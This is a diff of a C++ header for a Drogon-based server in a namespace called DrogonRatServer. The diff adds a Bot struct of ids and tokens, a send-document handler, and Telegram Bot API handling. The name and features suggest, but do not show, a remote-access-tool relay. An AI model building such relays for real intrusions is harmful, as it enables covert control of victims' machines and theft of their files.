@@ -12,31 +12,38 @@ using DrogonHandlerCallback =
     std::function<void(const drogon::HttpResponsePtr &)>;
 
 class Handler {
-  private:
-	std::filesystem::path db_file_path;
-	drogon::orm::DbClientPtr p_db_client;
+  public:
+    struct Bot {
+        int64_t id;
+        std::string token;
+    };
 
-	std::vector<std::string> cached_tokens = {};
+  private:
+    std::filesystem::path db_file_path;
+    drogon::orm::DbClientPtr p_db_client;
+
+    std::vector<Bot> cached_bots = {};
 
   public:
-	drogon::HttpAppFramework &drogon_app; // The parent class of this calls it,
-	/*Default constructors must be deleted*/
-	Handler() = delete;
-	Handler(const Handler &Other_Handler) = delete;
-	Handler(Handler &&Other_Handler) = delete;
+    drogon::HttpAppFramework &drogon_app; // The parent class of this calls it,
+    /*Default constructors must be deleted*/
+    Handler() = delete;
+    Handler(const Handler &Other_Handler) = delete;
+    Handler(Handler &&Other_Handler) = delete;
 
-	Handler(drogon::HttpAppFramework &Drogon_App);
+    Handler(drogon::HttpAppFramework &Drogon_App);
 
-	Handler &setDbFilePath(const std::filesystem::path &Db_File_Path);
-	Handler &initDbClient(void);
+    Handler &setDbFilePath(const std::filesystem::path &Db_File_Path);
+    Handler &initDbClient(void);
 
-	Handler &registerAll();
-	// Implimentation in src/Handler/methods.cpp
+    void registerAll();
+    //  Implimentation in src/Handler/methods.cpp
   protected:
-	void registerUploadHandler();
-	void registerEchoHandler();
+    void registerUploadHandler();
+    void registerEchoHandler();
 
-	void registerTelegramBotApiHandler();
+    void registerSendDocumentHandler();
+    void registerTelegramBotApiHandler();
 };
 
 } // namespace DrogonRatServer
